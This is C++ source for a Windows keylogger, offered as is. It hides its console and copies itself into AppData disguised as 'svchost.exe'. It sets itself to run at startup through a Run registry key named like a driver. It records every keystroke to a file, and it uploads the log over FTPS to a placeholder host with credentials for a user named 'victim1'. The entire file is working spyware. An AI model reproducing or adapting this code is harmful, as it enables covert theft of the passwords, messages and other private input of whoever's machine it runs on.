#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <string>

#include <wininet.h>
#include <fstream>

#include <curl/curl.h>
#include <fstream>
#include <iostream>
#include <string>
#include <windows.h>

using namespace std;

#pragma comment(lib, "wininet.lib")

using namespace std;

wstring userlc;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
void stealth();
void autoStart();
void userpath();
void autoCopy();
void startKeyLogger();
void ftplogsend();

// Host 127.0.0.1
// Listening port 14148
// Password 12345

int main() {
    userpath();
    wcout << L"Executable path: " << userlc + L"svchost.exe" << endl;
    autoCopy();
    autoStart();
    stealth();
    ftplogsend();
    startKeyLogger(); 
    
    return 0;
}

void startKeyLogger() {
    HHOOK hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    
    if (hKeyHook == NULL) {
        wcout << L"Failed to install hook!" << endl;
        return;
    }
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hKeyHook);
}

void stealth() {
    HWND stealth = FindWindowA("ConsoleWindowClass", NULL);
    if (stealth) {
        ShowWindow(stealth, 0); 
    }
}

void autoStart() {
    wchar_t Driver[MAX_PATH];
    HKEY hKey;
    wstring ff_path = userlc + L"svchost.exe";  
    wcscpy(Driver, ff_path.c_str());
    wcout << L"Setting auto-start with path: " << ff_path << endl;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"Windows Atapi x86_64 Driver", 0, REG_SZ, (const BYTE*)Driver, (DWORD)(wcslen(Driver) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    } else {
        wcout << L"Failed to open registry key for auto-start." << endl;
    }
}

void userpath() {
    wchar_t szDir[260];
    if (GetEnvironmentVariableW(L"APPDATA", szDir, 260) != 0) {
        userlc = szDir; 
        userlc += L"\\WPDNSE\\"; 
        CreateDirectoryW(userlc.c_str(), NULL);
    } else {
        wcerr << L"Failed to retrieve APPDATA path." << endl;
    }
}

void autoCopy() {
    wstring destinationDirectory = userlc;
    wstring destinationPath = destinationDirectory + L"svchost.exe";
    
    if (CreateDirectoryW(destinationDirectory.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
        wchar_t currentPath[MAX_PATH];
        GetModuleFileNameW(NULL, currentPath, MAX_PATH);
        if (CopyFileW(currentPath, destinationPath.c_str(), FALSE)) {
            wcout << L"File copied to: " << destinationPath << endl;
        } else {
            wcout << L"Failed to copy file. Error: " << GetLastError() << endl;
        }
    } else {
        wcout << L"Failed to create directory. Error: " << GetLastError() << endl;
    }
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        int keyStroke = pKeyBoard->vkCode;

        wstring logPath = userlc + L"LOG.TXT";
        FILE *OUTPUT_FILE;
        OUTPUT_FILE = _wfopen(logPath.c_str(), L"a+");
        if (OUTPUT_FILE != nullptr) {
            bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
            bool capsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

            wchar_t character;

            if (keyStroke >= 'A' && keyStroke <= 'Z') {
                if (shiftPressed ^ capsLockOn) {
                    character = (wchar_t)keyStroke;
                } else {
                    character = (wchar_t)(keyStroke + 32);
                }
                fputwc(character, OUTPUT_FILE);
            } 
            else {
                switch (keyStroke) {
                    case '1': fputws(shiftPressed ? L"!" : L"1", OUTPUT_FILE); break;
                    case '2': fputws(shiftPressed ? L"@" : L"2", OUTPUT_FILE); break;
                    case '3': fputws(shiftPressed ? L"#" : L"3", OUTPUT_FILE); break;
                    case '4': fputws(shiftPressed ? L"$" : L"4", OUTPUT_FILE); break;
                    case '5': fputws(shiftPressed ? L"%" : L"5", OUTPUT_FILE); break;
                    case '6': fputws(shiftPressed ? L"^" : L"6", OUTPUT_FILE); break;
                    case '7': fputws(shiftPressed ? L"&" : L"7", OUTPUT_FILE); break;
                    case '8': fputws(shiftPressed ? L"*" : L"8", OUTPUT_FILE); break;
                    case '9': fputws(shiftPressed ? L"(" : L"9", OUTPUT_FILE); break;
                    case '0': fputws(shiftPressed ? L")" : L"0", OUTPUT_FILE); break;

                    case VK_OEM_1: fputws(shiftPressed ? L":" : L";", OUTPUT_FILE); break;
                    case VK_OEM_PLUS: fputws(shiftPressed ? L"+" : L"=", OUTPUT_FILE); break;
                    case VK_OEM_COMMA: fputws(shiftPressed ? L"<" : L",", OUTPUT_FILE); break;
                    case VK_OEM_MINUS: fputws(shiftPressed ? L"_" : L"-", OUTPUT_FILE); break;
                    case VK_OEM_PERIOD: fputws(shiftPressed ? L">" : L".", OUTPUT_FILE); break;
                    case VK_OEM_2: fputws(shiftPressed ? L"?" : L"/", OUTPUT_FILE); break;
                    case VK_OEM_3: fputws(shiftPressed ? L"~" : L"`", OUTPUT_FILE); break;
                    case VK_OEM_4: fputws(shiftPressed ? L"{" : L"[", OUTPUT_FILE); break;
                    case VK_OEM_5: fputws(shiftPressed ? L"|" : L"\\", OUTPUT_FILE); break;
                    case VK_OEM_6: fputws(shiftPressed ? L"}" : L"]", OUTPUT_FILE); break;
                    case VK_OEM_7: fputws(shiftPressed ? L"\"" : L"'", OUTPUT_FILE); break;

                    case VK_RETURN: fputws(L"[Enter]\n", OUTPUT_FILE); break;
                    case VK_SPACE: fputws(L" ", OUTPUT_FILE); break;
                    case VK_TAB: fputws(L"[Tab]", OUTPUT_FILE); break;
                    case VK_BACK: fputws(L"[Backspace]", OUTPUT_FILE); break;
                    case VK_ESCAPE: fputws(L"[Esc]", OUTPUT_FILE); break;
                    case VK_CAPITAL: fputws(L"[Caps Lock]", OUTPUT_FILE); break;
                    case VK_SHIFT: fputws(L"[Shift]", OUTPUT_FILE); break;
                    case VK_CONTROL: fputws(L"[Ctrl]", OUTPUT_FILE); break;
                    case VK_MENU: fputws(L"[Alt]", OUTPUT_FILE); break;
                    case VK_LEFT: fputws(L"[Left Arrow]", OUTPUT_FILE); break;
                    case VK_RIGHT: fputws(L"[Right Arrow]", OUTPUT_FILE); break;
                    case VK_UP: fputws(L"[Up Arrow]", OUTPUT_FILE); break;
                    case VK_DOWN: fputws(L"[Down Arrow]", OUTPUT_FILE); break;

                    default:
                        break;
                }
            }

            fclose(OUTPUT_FILE);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void ftplogsend() {
    CURL *curl;
    CURLcode res;
    std::wofstream log_error_file(L"log_error.txt", std::ios::app);

    // Initialize libcurl
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, "ftps://127.0.0.1:14148/logs/log.txt");

        curl_easy_setopt(curl, CURLOPT_USE_SSL, CURLUSESSL_ALL);

        curl_easy_setopt(curl, CURLOPT_USERNAME, "victim1");
        curl_easy_setopt(curl, CURLOPT_PASSWORD, "12345");

        FILE *upload_file = fopen("log.txt", "rb");
        if (!upload_file) {
            log_error_file << L"Failed to open log file for uploading." << endl;
            curl_easy_cleanup(curl);
            curl_global_cleanup();
            return;
        }

        curl_easy_setopt(curl, CURLOPT_READDATA, upload_file);
        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);

        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            log_error_file << L"Error uploading file: " << curl_easy_strerror(res) << endl;
        } else {
            log_error_file << L"File uploaded successfully." << endl;
        }

        fclose(upload_file);
        curl_easy_cleanup(curl);
    } else {
        log_error_file << L"Failed to initialize libcurl." << endl;
    }

    curl_global_cleanup();
    log_error_file.close();
}
